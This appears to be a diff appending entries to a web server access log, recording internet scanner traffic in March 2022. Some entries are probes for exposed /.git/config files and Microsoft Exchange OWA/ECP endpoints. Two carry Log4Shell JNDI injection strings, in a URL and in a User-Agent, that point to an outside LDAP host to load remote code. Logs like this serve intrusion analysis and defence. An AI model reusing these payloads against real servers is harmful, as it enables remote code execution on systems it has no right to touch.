@@ -5757,3 +5757,17 @@
 [2022-03-24T23:41:26.347Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.138.61 - ? ?IP?:443 -
 [2022-03-24T23:41:26.978Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.138.61 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" ? ?IP? -
 [2022-03-24T23:50:57.970Z] "GET / HTTP/1.1" 301 - 0 0 0 - 164.90.141.179 "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0" ? ?IP? -
+[2022-03-25T01:49:38.346Z] "GET /.git/config HTTP/1.1" 301 - 0 0 0 - 179.43.176.91 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5" ? ?IP? -
+[2022-03-25T06:40:50.520Z] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 301 - 0 0 0 - 192.241.222.191 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-25T07:08:44.156Z] "GET / HTTP/1.0" 426 - 0 0 0 - --106.75.246.50++ - - ?IP?:443 -
+[2022-03-25T15:56:50.905Z] "GET / HTTP/2" 301 - 0 0 0 - 139.162.217.121 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0" ? ?IP? -
+[2022-03-25T16:03:36.467Z] "GET /.git/config HTTP/1.1" 301 - 0 0 0 - 179.43.176.91 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" ? ?IP? -
+[2022-03-25T21:02:59.544Z] "GET / HTTP/1.0" 426 - 0 0 0 - --175.42.33.246++ - - - -
+[2022-03-26T02:25:22.614Z] "GET / HTTP/1.1" 301 - 0 0 0 - 23.90.160.122 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" ? ?IP? -
+[2022-03-26T06:26:47.954Z] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 - 0 0 0 - 192.241.223.68 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-26T06:40:57.169Z] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 301 - 0 0 0 - 192.241.224.241 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
+[2022-03-26T07:54:14.932Z] "GET /$%7Bjndi:ldap:/115.28.134.231:1389/Exploit%7D HTTP/1.1" 301 - 0 0 0 - 41.203.140.114 "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox" ? ?IP? -
+[2022-03-26T07:54:16.033Z] "GET / HTTP/1.1" 301 - 0 0 0 - 41.203.140.114 ${jndi:ldap://115.28.134.231:1389/Exploit} ? ?IP? -
+[2022-03-26T07:54:17.158Z] "POST /login HTTP/1.1" 301 - 0 0 2 - 41.203.140.114 "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox" ? ?IP? -
+[2022-03-26T07:54:18.287Z] "GET / HTTP/1.1" 301 - 0 0 2 - 41.203.140.114 curl/7.58.0 ? ?IP? -
+[2022-03-26T08:06:00.376Z] "GET / HTTP/1.1" 301 - 0 0 0 - 192.241.225.222 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
